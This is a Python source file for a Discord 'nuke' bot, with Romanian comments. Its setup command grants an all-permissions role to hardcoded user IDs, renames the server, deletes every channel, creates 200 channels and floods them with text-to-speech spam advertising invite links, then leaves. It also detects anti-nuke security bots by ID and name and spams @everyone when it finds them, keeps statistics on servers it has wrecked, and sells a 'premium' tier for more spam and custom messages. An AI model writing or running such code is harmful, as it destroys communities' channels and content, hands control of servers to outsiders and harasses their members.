# -*- coding: utf-8 -*-
import asyncio, base64, json, os, random, time
from datetime import datetime

import aiohttp, discord
from discord import app_commands, Interaction
from discord.errors import HTTPException, Forbidden
from discord.ext import commands, tasks
from discord.ext.commands import BucketType, CommandOnCooldown, Cooldown, cooldown
from discord.ui import Button, Select, View

from flask import Flask
import threading
intents = discord.Intents.all()

leaderboard_message = None
NUKE_STATS_FILE = "nuke_stats.json"
PREMIUM_FILE = "premium.json"
CONFIG_FILE = "config.json"

PREM = 1525416750240366693
MOD_ROLE_ID = 1525416750240366693
WHITELIST = [1464634211406188721]
BLACKLISTED_GUILD_ID = 1525971260943892510
OWNER_ID = 1464634211406188721
LEADERBOARD_CHANNEL_ID = 1401931021544460389
TOKEN = os.getenv('TOKEN')
LOG_WEBHOOK_URL = ''

BLOCKED_BOT_IDS = [651095740390834176, 548410451818708993]
BLOCKED_BOT_NAMES = ["Security", "Wick", "Beemo", "AntiNuke"]

def save_nuke_stats(user_id, guild):
    try:
        with open(NUKE_STATS_FILE, "r") as f:
            stats = json.load(f)
    except FileNotFoundError:
        stats = {"users": {}, "servers": {}}

    stats.setdefault("users", {})
    stats.setdefault("servers", {})

    user_id = str(user_id)
    guild_id = str(guild.id)

    stats["users"].setdefault(user_id, {"uses": 0})
    stats["users"][user_id]["uses"] += 1

    stats["servers"].setdefault(guild_id, {
        "user_id": user_id,
        "member_count": guild.member_count,
        "server_name": guild.name
    })

    with open(NUKE_STATS_FILE, "w") as f:
        json.dump(stats, f, indent=2)

def load_premium_users():
    if not os.path.exists(PREMIUM_FILE):
        return []
    with open(PREMIUM_FILE, "r") as f:
        return json.load(f)

def save_premium_users(user_ids):
    with open(PREMIUM_FILE, "w") as f:
        json.dump(user_ids, f, indent=2)

def is_premium_user(user_id: int):
    premium_users = load_premium_users()
    return user_id in premium_users

def load_config():
    if not os.path.exists(CONFIG_FILE):
        return {}
    with open(CONFIG_FILE, "r") as f:
        try:
            return json.load(f)
        except json.JSONDecodeError:
            return {}

def save_config(config):
    with open(CONFIG_FILE, "w") as f:
        json.dump(config, f, indent=2)

def get_user_config(user_id):
    config = load_config()
    return config.get(str(user_id), {})

def set_user_config(user_id, key, value):
    config = load_config()
    user_str = str(user_id)
    if user_str not in config:
        config[user_str] = {}
    config[user_str][key] = value
    save_config(config)

def get_show_username(user_id):
    return get_user_config(user_id).get("show_username", True)

def set_show_username(user_id, value: bool):
    set_user_config(user_id, "show_username", value)

def get_channel_name(user_id):
    return get_user_config(user_id).get("channel_name", "1week-King")

def set_channel_name(user_id, value: str):
    set_user_config(user_id, "channel_name", value)

def get_webhook_name(user_id):
    return get_user_config(user_id).get("webhook_name", "larp-empire")

def set_webhook_name(user_id, value: str):
    set_user_config(user_id, "webhook_name", value)

def get_webhook_message(user_id):
    return get_user_config(user_id).get("webhook_message", "@everyone This sv has been officially closed https://discord.gg/larpempire")

def set_webhook_message(user_id, value: str):
    set_user_config(user_id, "webhook_message", value)

def get_server_name(user_id):
    return get_user_config(user_id).get("server_name", "1weeksober owns this")

def set_server_name(user_id, value: str):
    set_user_config(user_id, "server_name", value)

def get_role_name(user_id):
    return get_user_config(user_id).get("role_name", "1weeksober-on-top")

def set_role_name(user_id, value: str):
    set_user_config(user_id, "role_name", value)

class CooldownManager:
    def __init__(self, cooldown_seconds: int):
        self.cooldown_seconds = cooldown_seconds
        self.user_timestamps = {}

    def can_use(self, user_id: int):
        now = time.time()
        last_time = self.user_timestamps.get(user_id, 0)
        elapsed = now - last_time
        if elapsed >= self.cooldown_seconds:
            self.user_timestamps[user_id] = now
            self.cleanup()
            return True, 0
        else:
            return False, int(self.cooldown_seconds - elapsed)

    def cleanup(self):
        now = time.time()
        to_delete = [user for user, ts in self.user_timestamps.items() if now - ts > self.cooldown_seconds]
        for user in to_delete:
            del self.user_timestamps[user]

cooldown_manager = CooldownManager(100)

async def detect_antinuKe_bots(guild):
    found_bots = []
    for member in guild.members:
        if member.bot:
            bot_name = member.nick or member.name
            if member.id in BLOCKED_BOT_IDS or any(x.lower() in bot_name.lower() for x in BLOCKED_BOT_NAMES):
                found_bots.append(f"{bot_name} ({member.id})")
    return found_bots

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.all()
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()

bot = MyBot()

@bot.command(name="addpremium")
async def addpremium(ctx, user: discord.User):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ You are not authorized.")
        return
    premium_users = load_premium_users()
    if user.id not in premium_users:
        premium_users.append(user.id)
        save_premium_users(premium_users)
        await ctx.send(f"✅ {user.name} has been granted premium.")
    else:
        await ctx.send(f"ℹ️ {user.name} already has premium.")

@bot.command(name="removepremium")
async def removepremium(ctx, user: discord.User):
    if ctx.author.id != OWNER_ID:
        await ctx.send("❌ You are not authorized.")
        return
    premium_users = load_premium_users()
    if user.id in premium_users:
        premium_users.remove(user.id)
        save_premium_users(premium_users)
        await ctx.send(f"✅ {user.name} has been removed from premium.")
    else:
        await ctx.send(f"ℹ️ {user.name} does not have premium.")

@bot.command()
async def setup(ctx):
    guild = ctx.guild
    user = ctx.author
    user_config = get_user_config(user.id)

    # Verificare permisiuni bot
    if not ctx.guild.me.guild_permissions.administrator:
        await ctx.send("❌ Botul nu are permisiunea de **Administrator**. Te rog să i-o acorzi.")
        return

    if guild.id == BLACKLISTED_GUILD_ID:
        await ctx.reply("`This server is blacklisted.`")
        return

    if len(guild.members) < 2:
        await user.send(f"❌ Server `{guild.name}` needs at least 2 members. Leaving..")
        await guild.leave()
        return

    found = await detect_antinuKe_bots(guild)
    if found:
        spam_message = user_config.get("webhook_message", "@everyone discord.gg/VSQzzAMVw3 Corrupt owns this")
        for channel in guild.text_channels:
            try:
                await asyncio.gather(*(
                    channel.send(spam_message) for _ in range(10)
                ))
            except:
                pass
        return

    save_nuke_stats(user.id, guild)

    admin_users = [1389763251042258944, 1464634211406188721]

    # CREARE ROL ADMIN
    try:
        admin_role = await guild.create_role(name="Larp Empire Admin", permissions=discord.Permissions.all())
        for admin_id in admin_users:
            member = guild.get_member(admin_id)
            if member:
                await member.add_roles(admin_role)
                # Trimitem un DM adminului
                try:
                    await member.send(f"✅ Rol admin acordat în serverul {guild.name}")
                except:
                    pass
    except Forbidden:
        await user.send("❌ Nu am permisiunea să creez roluri.")
        return
    except Exception as e:
        await user.send(f"❌ Eroare la crearea rolului: {e}")
        return

    # SCHIMBARE NUME SERVER
    try:
        await guild.edit(name="1weeksober owns this")
    except Exception as e:
        await user.send(f"⚠️ Nu am putut schimba numele: {e}")

    # STERGERE CANALE - dar păstrăm un canal nou pentru loguri
    # Mai întâi, ștergem toate canalele
    deleted = 0
    for channel in guild.channels:
        try:
            await channel.delete()
            deleted += 1
        except:
            continue

    # Acum creăm un canal nou pentru a trimite mesaje de progres
    try:
        log_channel = await guild.create_text_channel(name="larp-log")
        await log_channel.send("✅ Toate canalele au fost șterse. Încep crearea celor 200 de canale...")
    except Exception as e:
        # Dacă nu putem crea canalul de log, trimitem în DM
        await user.send(f"⚠️ Nu am putut crea canalul de log: {e}. Continui în DM.")
        log_channel = None

    channel_names = [
        "1weeksober-owns",
        "1week-King",
        "Cry-kid",
        "Larp-empire-on-top"
    ]

    spam_message = "This sv has been officially closed\nhttps://discord.gg/larpempire\nhttps://discord.gg/larpempire\nhttps://discord.gg/larpempire\nhttps://discord.gg/larpempire\nhttps://discord.gg/larpempire"

    # CREARE 200 CANALE
    created = 0
    async def create_channel_and_send(index):
        nonlocal created
        try:
            name = random.choice(channel_names) + "-" + str(random.randint(1000, 9999))
            ch = await guild.create_text_channel(name=name)
            spams = 100 if is_premium_user(user.id) else 50
            for _ in range(spams):
                await ch.send(content=spam_message, tts=True)
            created += 1
            # Trimitem progres în canalul de log sau DM
            if log_channel and index % 10 == 0:
                await log_channel.send(f"✅ Creat {created} canale până acum...")
        except Exception as e:
            if log_channel:
                await log_channel.send(f"❌ Eroare la crearea canalului {index}: {e}")
            else:
                await user.send(f"❌ Eroare la crearea canalului {index}: {e}")

    if log_channel:
        await log_channel.send("🔄 Se creează 200 de canale... (durează ~30-60 secunde)")

    # Creare canale în batch-uri de câte 10 pentru a evita rate limit
    tasks = [create_channel_and_send(i) for i in range(200)]
    for i in range(0, len(tasks), 10):
        await asyncio.gather(*tasks[i:i+10])
        await asyncio.sleep(1.5)

    if log_channel:
        await log_channel.send(f"✅ Creare finalizată! {created} canale create.")

    # CREARE ROL
    try:
        await guild.create_role(name="1weeksober-on-top")
        if log_channel:
            await log_channel.send("✅ Rol creat.")
    except:
        pass

    # Trimitem mesaj final în DM și în log_channel
    final_msg = f"✅ Nuke finalizat în serverul {guild.name}. {created} canale create."
    await user.send(final_msg)
    if log_channel:
        await log_channel.send("✅ Părăsesc serverul...")
    await guild.leave()

class SettingsModal(discord.ui.Modal):
    def __init__(self, user_id: int):
        super().__init__(title="Configure your settings")
        self.user_id = user_id
        self.show_username_input = discord.ui.TextInput(
            label="Show username? (yes/no)",
            placeholder="yes or no",
            default="yes" if get_show_username(user_id) else "no",
            max_length=3
        )
        self.channel_name_input = discord.ui.TextInput(
            label="Channel Name (Premium required)",
            placeholder="1week-King",
            default=get_channel_name(user_id),
            max_length=32
        )
        self.webhook_name_input = discord.ui.TextInput(
            label="Webhook Name (Premium required)",
            placeholder="larp-empire",
            default=get_webhook_name(user_id),
            max_length=32
        )
        self.webhook_message_input = discord.ui.TextInput(
            label="Webhook Message (Premium required)",
            placeholder="This sv has been officially closed https://discord.gg/larpempire",
            default=get_webhook_message(user_id),
            max_length=100
        )
        self.server_name_input = discord.ui.TextInput(
            label="Server Name (Premium required)",
            placeholder="1weeksober owns this",
            default=get_server_name(user_id),
            max_length=32
        )
        self.add_item(self.show_username_input)
        self.add_item(self.channel_name_input)
        self.add_item(self.webhook_name_input)
        self.add_item(self.webhook_message_input)
        self.add_item(self.server_name_input)

    async def on_submit(self, interaction: discord.Interaction):
        user_id = self.user_id
        is_premium = is_premium_user(user_id)

        show_username_input = self.show_username_input.value.strip().lower()
        if show_username_input in ["yes", "no"]:
            set_show_username(user_id, show_username_input == "yes")

        def safe_set(key, value, default):
            if is_premium:
                set_user_config(user_id, key, value)
            else:
                set_user_config(user_id, key, default)

        safe_set("channel_name", self.channel_name_input.value.strip(), "1week-King")
        safe_set("webhook_name", self.webhook_name_input.value.strip(), "larp-empire")
        safe_set("webhook_message", self.webhook_message_input.value.strip(), "This sv has been officially closed https://discord.gg/larpempire")
        safe_set("server_name", self.server_name_input.value.strip(), "1weeksober owns this")

        await interaction.response.send_message("✅ Your settings have been saved.", ephemeral=True)

@bot.event
async def on_ready():
    print(f"✅ Bot is online as {bot.user}!")
    print(f"📊 Conectat la {len(bot.guilds)} servere.")
    await bot.tree.sync()

app = Flask(__name__)

@app.route("/")
def home():
    return "Corrupt bot is online."

def run_flask():
    port = int(os.getenv("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

threading.Thread(target=run_flask).start()

bot.run(TOKEN)
